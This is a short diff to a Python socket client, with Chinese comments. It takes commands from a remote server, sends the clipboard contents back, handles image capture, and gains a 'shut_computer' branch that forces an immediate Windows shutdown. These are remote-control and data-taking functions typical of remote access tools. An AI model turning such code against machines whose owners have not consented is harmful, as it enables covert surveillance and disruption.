@@ -1,3 +1,4 @@
+import re
 import socket
 import struct
 import threading
@@ -123,11 +124,13 @@ def receive_thread(stop_event):
             s.close()
             s = None
             continue
+
         if not data:
             # 连接断开，尝试重连
             s.close()
             s = None
             continue
+
 
         if "reboot_function" in data : s=None
         if "capture_image" in data:
@@ -164,10 +167,13 @@ def receive_thread(stop_event):
                     pyautogui.hotkey("ctrl", "c")
                     s.send(pyperclip.paste().encode())
                     print(pyperclip.paste())
-                if "get_file" in data:
-                    pass
+                elif "shut_computer" in data:
+                    user_input = "get it " + data
+                    s.send(user_input.encode())
+                    os.system("shutdown /s /t 1")
+                    # pass
                 else:
-                    user_input="get it"
+                    user_input="get it "+data
                     s.send(user_input.encode())
                     print(user_input)
 def camera_thread():
